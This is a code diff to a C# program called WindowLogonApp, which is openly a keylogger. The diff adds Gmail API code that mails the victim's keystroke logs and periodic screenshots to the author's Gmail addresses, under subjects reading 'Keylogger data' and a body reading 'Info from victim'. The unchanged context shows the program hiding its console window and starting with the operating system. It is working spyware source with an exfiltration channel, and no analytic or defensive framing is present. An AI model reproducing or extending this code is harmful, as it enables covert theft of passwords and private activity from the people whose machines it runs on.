@@ -14,6 +14,13 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
+using Google.Apis.Auth.OAuth2;
+using Google.Apis.Gmail.v1;
+using Google.Apis.Gmail.v1.Data;
+using Google.Apis.Services;
+using Google.Apis.Util.Store;
+using MimeKit;
+
 namespace WindowLogonApp
 {
     class Program
@@ -121,7 +128,7 @@ namespace WindowLogonApp
         static string imageExtendtion = ".png";
 
         static int imageCount = 0;
-        static int captureTime = 1000;
+        static int captureTime = 10000;
 
         static void CaptureScreen()
         {
@@ -163,16 +170,16 @@ namespace WindowLogonApp
         static int sentId = 0;
         static void StartTimer()
         {
-            Thread thread = new Thread(()=>
+            System.Threading.Thread thread = new System.Threading.Thread(()=>
             {
                 while(true)
                 {
-                    Thread.Sleep(1);
+                    System.Threading.Thread.Sleep(1);
                     if(interval%captureTime==0)
                         CaptureScreen();
                     if (interval%mailTime == 0)
                     {
-                        sendMail();
+                        UseMimekitToSend(service);
                         sentId++;
                         if(sentId%20==0)
                             DeleteAllFile();
@@ -186,7 +193,7 @@ namespace WindowLogonApp
             thread.Start();
         }
         #endregion
-
+       
         #region Hiden Windows
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -211,9 +218,112 @@ namespace WindowLogonApp
 
         #endregion
 
-        #region Mail
-        public static int mailTime = 5000;
 
+
+        #region Mail
+        #region Authorization Gmail api
+        static string[] Scopes = { GmailService.Scope.GmailReadonly, GmailService.Scope.GmailSend };
+        static string ApplicationName = "WindowLog";
+        static UserCredential AuthorizationGmail()
+        {
+            UserCredential credential;
+            using (var stream =
+                new FileStream("credentials.json", FileMode.Open, FileAccess.Read))
+            {
+                //The file token.json stores the user's access and refress tokens, and is created
+                //automatically when the authorization flow completes for the first tiem.
+                string credPath = "token.json";
+                credential = GoogleWebAuthorizationBroker.AuthorizeAsync(
+                    GoogleClientSecrets.Load(stream).Secrets,
+                    Scopes,
+                    "user",
+                    CancellationToken.None,
+                    new FileDataStore(credPath, true)).Result;
+            }
+            return credential;
+        }
+        static Google.Apis.Gmail.v1.Data.Message SendMessageByGmailApi(GmailService service, string userID, Google.Apis.Gmail.v1.Data.Message email)
+        {
+            try
+            {
+                return service.Users.Messages.Send(email, userID).Execute();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+            return null;
+        }
+
+        #endregion
+        static string Base64UrlEndcode(string textInput)
+        {
+            var inputBytes = System.Text.Encoding.UTF8.GetBytes(textInput);
+            return Convert.ToBase64String(inputBytes).Replace('+', '-').Replace('/', '_').Replace("=", "");
+        }
+        static void UseRawDataToSend(GmailService service)
+        {
+            string text = "To:dangnt520@gmail.com\r\n" +
+                "Subject: Gmail send api test\r\n" +
+                "Content-Type: text/html; charset:us-ascii\r\n\r\n" +
+                "<h1>TestGamil API Testing for sending</h1>";
+            var newMeg = new Google.Apis.Gmail.v1.Data.Message();
+            newMeg.Raw = Base64UrlEndcode(text);
+            SendMessageByGmailApi(service, "me", newMeg);
+
+        }
+        static void UseMimekitToSend(GmailService service)
+        {
+            MimeMessage mimeMes = new MimeMessage();
+            mimeMes.Cc.Add(new MailboxAddress("nguyen.dang.tlu@gmail.com"));
+            mimeMes.Subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name + " Keylogger data: " + DateTime.Now.ToLongDateString();
+            var multipart = new Multipart("mixed");
+            string logFile = directoryTemp + logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            var body = new TextPart("plain")
+            {
+                Text = ReadFromKeyLogFile(logFile)
+            };
+            multipart.Add(body);
+            string directoryImage = directoryTemp + imagePath + DateTime.Now.ToLongDateString() + sentId;
+            DirectoryInfo image = new DirectoryInfo(directoryImage);
+            foreach (FileInfo item in image.GetFiles("*.png"))
+            {
+                if (File.Exists(directoryImage + "\\" + item.Name))
+                {
+                    string path = directoryImage + "\\" + item.Name;
+                    var attachment = new MimePart("image", "png")
+                    {
+                        Content = new MimeContent(File.OpenRead(path), ContentEncoding.Default),
+                        ContentDisposition = new ContentDisposition(ContentDisposition.Attachment),
+                        ContentTransferEncoding = ContentEncoding.Base64,
+                        FileName = Path.GetFileName(path)
+                    };
+                    multipart.Add(attachment);
+                }
+            }
+            mimeMes.Body = multipart;
+            var mes = new Google.Apis.Gmail.v1.Data.Message
+            {
+                Raw = Base64UrlEndcode(mimeMes.ToString())
+            };
+            SendMessageByGmailApi(service, "me", mes);
+
+
+
+        }
+        static string ReadFromKeyLogFile(string path)
+        {
+
+            string result = "Keylog: \n";
+            if (File.Exists(path))
+            {
+                StreamReader sr = new StreamReader(path);
+                result += sr.ReadToEnd();
+                sr.Close();
+            }
+            return result;
+        }
+        public static int mailTime = 50000;
         static void sendMail()
         {
             try
@@ -223,7 +333,7 @@ namespace WindowLogonApp
 
                 mail.From = new MailAddress("nguyen.dang.tlu@gmail.com");
                 mail.To.Add("nguyen.dang.tlu@gmail.com");
-                mail.Subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name + "Keylogger data: " + DateTime.Now.ToLongDateString();
+                mail.Subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name + " Keylogger data: " + DateTime.Now.ToLongDateString();
                 mail.Body = "Info from victim\n";
                 string logFile = directoryTemp + logName + DateTime.Now.ToLongDateString() + logExtendtion;
 
@@ -325,9 +435,18 @@ namespace WindowLogonApp
             }
         }
         #endregion
+        static UserCredential credential;
+        static GmailService service;
         static void Main(string[] args)
         {
             StartWithOS();
+            credential = AuthorizationGmail();
+            service = new GmailService(new BaseClientService.Initializer()
+            {
+                HttpClientInitializer = credential,
+                ApplicationName = ApplicationName
+
+            });
             if (!Directory.Exists(directoryTemp))
                 Directory.CreateDirectory(directoryTemp);
             
